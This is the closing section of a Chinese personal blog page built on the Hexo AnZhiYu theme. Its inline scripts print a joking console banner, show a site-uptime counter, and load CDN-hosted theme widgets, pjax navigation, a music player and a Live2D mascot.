var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/20/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 guipi 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("03/20/2025 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "";
        img.title = "";
        img.alt = "";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script defer="defer" id="ribbon" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>